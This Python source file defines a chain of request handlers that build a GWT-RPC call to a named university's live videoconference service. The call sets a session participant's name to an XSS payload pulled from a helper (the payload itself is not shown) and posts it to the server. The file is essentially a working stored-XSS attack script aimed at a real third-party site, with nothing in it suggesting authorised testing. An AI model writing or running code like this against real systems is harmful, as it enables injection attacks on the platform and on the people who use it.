import abc
import requests
from context import RequestContext
from exceptions import ChainException


class Handler(abc.ABC):
    def __init__(self, next_handler=None):
        self._next_handler = next_handler

    def set_next(self, handler):
        self._next_handler = handler
        return handler

    @abc.abstractmethod
    def handle_request(self, context: RequestContext):
        if self._next_handler:
            return self._next_handler.handle_request(context)
        return context


class SetupRequestHandler(Handler):
    def handle_request(self, context: RequestContext):
        print("SetupRequestHandler: Preparing headers...")
        return super().handle_request(context)


class PayloadHandler(Handler):
    def handle_request(self, context: RequestContext):
        print("PayloadHandler: Forming payload...")
        try:


            gwt_base_url = "https://e-class.tsu.ru/videoconference/"
            gwt_strong_name = "0A73E0CE3100205FB4E268695C482E09"
            service_name = "com.mind.videoconference.rpc.api.ConferenceSessionService"
            method_name = "setParticipantName"
            param1_type = "com.mind.videoconference.dto.id.ConferenceSessionParticipantId/1079013347"
            param2_type = "java.lang.String/2004016611"
            param3_type = "java.util.UUID/2940008275"

            session_participant_id = context.session_id
            participant_name = context.get_formatted_xss_payload()

            context.payload_data = (
                f"7|0|9|{gwt_base_url}|{gwt_strong_name}|"
                f"{service_name}|{method_name}|"
                f"{param1_type}|{param2_type}|{param3_type}|"
                f"{session_participant_id}|{participant_name}|"
                f"1|2|3|4|2|5|6|5|7|8|9|"
            )
            print(f"Payload formed with session_id: {session_participant_id}")
        except Exception as e:
            raise ChainException(f"PayloadHandler: Error forming payload: {str(e)}")
        return super().handle_request(context)


class ExecutionHandler(Handler):
    def handle_request(self, context: RequestContext):
        print("ExecutionHandler: Sending HTTP request...")
        if not all([context.url, context.headers, context.payload_data]):
            raise ChainException(
                "ExecutionHandler: Missing URL, headers, or payload data"
            )

        try:
            response = requests.post(
                context.url,
                headers=context.headers,
                data=context.payload_data.encode("utf-8"),
            )
            context.response = response
            print(f"Request sent to {context.url}. Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            raise ChainException(f"ExecutionHandler: HTTP request error: {str(e)}")
        return super().handle_request(context)


class LoggingHandler(Handler):
    def handle_request(self, context: RequestContext):
        print("LoggingHandler: Logging request details...")
        # Add logging to a file or external service
        print(f"URL: {context.url}, Session ID: {context.session_id}")
        return super().handle_request(context)
